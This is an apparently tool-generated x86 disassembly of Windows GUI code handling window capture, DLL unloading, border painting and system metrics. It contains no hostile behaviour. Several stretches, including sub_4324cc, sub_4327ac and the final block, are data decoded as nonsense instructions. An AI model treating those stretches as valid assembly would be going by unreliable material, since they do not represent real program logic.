push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x168 ] 0x0
jne r-xdata
cmp bl [ esi + 0x170 ]
je r-xdata
xor ebx ebx
pop esi
pop ebx
retn
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov [ esi + 0x170 ] bl
test bl bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov [ esi + 0x182 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ esi + 0x182 ] 0x0
jne r-xdata
mov eax esi
call sub_431f94
mov [ esi + 0x182 ] 0x3
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
test bl bl
je r-xdata
sub_4320c4
push esi
mov esi eax
cmp dl [ esi + 0x178 ]
je r-xdata
pop esi
retn
mov [ esi + 0x178 ] dl
test dl dl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_432134
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
and eax 0x7f
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x16c ]
call sub_430ac4
mov eax ebx
call sub_431c8c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop ebx
retn
sub_432168
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x4 ]
cmp eax [ ebx + 0x168 ]
jne r-xdata
pop esi
pop ebx
retn
mov esi [ edx + 0x8 ]
cmp ebx esi
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov al [ esi + 0x172 ]
mov [ ebx + 0x172 ] al
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebx + 0x170 ] 0x0
mov [ ebx + 0x182 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_44c264
sub_4321d8
push ebp
mov ebp esp
push 0x0
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_432261
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43fbb0
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_457500
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax esi
mov si 0xffeb
call sub_403368
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432268
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_4322a4
push ebx
push esi
mov esi eax
mov eax esi
call sub_441910
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
call sub_432b54
call sub_432c34
test al al
je r-xdata
cmp [ esi + 0x5d ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x181 ] 0x1
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call GetCapture
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_432318
push ebx
push esi
mov esi eax
mov eax esi
call sub_441928
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov [ esi + 0x181 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call sub_432b54
call sub_432c34
test al al
je r-xdata
cmp [ esi + 0x171 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_432380
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_431f30
mov ebx eax
mov edx [ esi + 0x34 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ esi + 0x30 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax ebx
call sub_426ec4
mov eax [ eax + 0x14 ]
mov edx 0xff00ff
call sub_4221f8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_416a60
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_426ec4
pop edx
call sub_4225d0
push 0x0
push edi
push 0x1
mov eax ebx
call sub_426ec4
mov edx eax
xor ecx ecx
mov eax esi
call sub_44d5e8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432410
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_441ab8
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
test bl bl
jne r-xdata
mov edx [ esi + 0x6c ]
mov eax [ ebp - 0x4 ]
call sub_432058
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_431f30
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax [ esi + 0x5c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ esi + 0x80 ] 0x0
jl r-xdata
mov ebx esi
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_44d0d0
cmp eax [ ebx + 0x80 ]
jle r-xdata
push ebp
mov eax esi
mov edx [ eax + 0x80 ]
mov eax [ eax + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_432380
pop ecx
sub_4324cc
or al [ eax ]
add [ eax ] al
or [ edx + 0x48 ] bh
add ah bl
xchg [ eax ] ecx
add [ eax ] al
add [ eax ] al
add al 0x7a
dec eax
add [ eax ] cl
xchg [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ edx + 0x48 ] bh
add [ ebp + eax * 4 + 0x48 ] al
add [ eax ] al
cld
jns r-xdata
add [ eax + 0x4885 ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add al ch
xchg [ eax ] cl
add [ eax ] al
add [ eax ] al
clc
jns r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
call sub_4324b0
xor eax eax
push ebp
push sub_432574
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add [ eax ] ah
mov [ eax ] cl
add [ eax ] al
add [ eax ] al
hlt
sub_4325a8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4325cd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4325d4
retn
sub_4325ef
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_432634
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43263b
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4049c8
sub_432657
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_43269c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4326a3
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4049c8
sub_4326b3
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_432709
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432710
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403f40
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_43271c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_432760
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432767
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_432774
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_432799
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4327a0
retn
sub_4327ac
clc
daa
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ebx ] al
add al 0x0
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax + ebp + 0x28980043 ] al
inc ebx
add [ ebx ] cl
push esp
inc ebx
outsd
outsb
jbe r-xdata
jb r-xdata
insb
imul ebp [ edi + 0x6e ] r-xdata
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
insb
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
insb
jb r-xdata
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
add [ eax ] al
add [ eax - 0x1 ] dl
add eax [ eax ]
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
nop
push sub_43291b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add bh bh
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432922
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_40497c
mov eax rw-data
mov edx [ r-xdata ]
call sub_40497c
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4328ac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43291b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432922
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_40497c
mov eax rw-data
mov edx [ r-xdata ]
call sub_40497c
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_432b74
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_42aef4
mov [ esi + 0x5 ] al
call sub_43284c
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_4334b4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_432bc0
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax esi
call sub_432c60
call sub_42ad34
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_432bf4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_432c60
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_432ca4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_432bf4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_432cf4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_432bf4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_432d40
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_432bf4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_432d84
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_432bf4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_432dcc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_432bf4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_432e34
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_432eb8
mov [ ecx ] 0x2
mov eax edx
add al 0xfe
sub al 0x4
jae r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_432ee4
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_432f20
mov [ ecx ] 0x12
xor eax eax
mov al dl
cmp eax 0x14
jge r-xdata
add eax 0xffffffec
sub eax 0x6
jb r-xdata
add eax 0xfffffffe
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x14
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x6
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x5
mov eax 0x1a
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x8
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x20
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xe
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_432fbc
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_432fd9 ]
jmp [ eax * 4 + jump_table_433042 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_433348
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_4334a3
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_432ee4
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_432d40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_416a60
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_4334d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43350b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433512
retn
mov eax [ rw-data ]
call sub_40316c
mov eax rw-data
call sub_403f40
sub_433aa1
pop ebp
inc ebx
add [ eax ] dh
pop esi
inc ebx
add [ eax + 0xff0001 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x540b0020 ] al
jb r-xdata
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
outsb
jae r-xdata
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9423ba1
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
push edi
add [ eax ] eax
jmp [ eax ]
popad
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
jo r-xdata
jb r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
aam 0xaa
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
stosb [ edi ]
jo r-xdata
inc eax
add [ edi ] dl
add bh bh
sar dl 0x1
inc ebx
add [ eax + 0x1c ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] r--data
adc [ eax ] al
outsd
add [ eax ] eax
call [ eax + 0x100435e ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push edx
jns r-xdata
xor eax 0x16e0043
add bh bh
je r-xdata
inc esp
outsd
arpl [ ebx + 0x20 ] bp
lodsd [ esi ]
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
push ebp
jo r-xdata
je r-xdata
inc esp
outsd
ja r-xdata
add [ eax ] al
lodsb [ esi ]
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
jne r-xdata
inc ecx
add [ eax ] ah
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
popad
add [ eax - 0x3fffbc10 ] al
